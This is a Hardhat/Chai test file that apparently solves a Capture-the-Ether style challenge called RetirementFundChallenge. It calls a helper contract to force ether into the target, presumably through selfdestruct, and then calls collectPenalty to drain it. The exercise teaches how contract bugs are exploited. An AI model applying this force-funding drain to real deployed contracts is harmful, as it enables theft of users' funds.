const { assert } = require("chai");
const { deployContract } = require("ethereum-waffle");
const { ethers, getNamedAccounts } = require("hardhat");

describe("09-RetirementFundChallenge", function () {
    let targetContract, forceFundsContract, player;
    beforeEach(async function () {
        //make a snapshot by calling fixture
        await deployments.fixture("9");
        deployer = (await getNamedAccounts()).deployer;
        player = (await getNamedAccounts()).player;
        targetContract = await ethers.getContract("RetirementFundChallenge", player);
        forceFundsContract = await ethers.getContract("RetirementFundForceEther", player);
    });

    describe("selfDestruct, collectPenalty", async function () {
        it("force funds to target contract and withdraw all ether", async function () {
            await forceFundsContract.forceEther();
            await targetContract.collectPenalty();

            const isComplete = await targetContract.isComplete();
            assert.equal(isComplete, true);
        });
    });
});
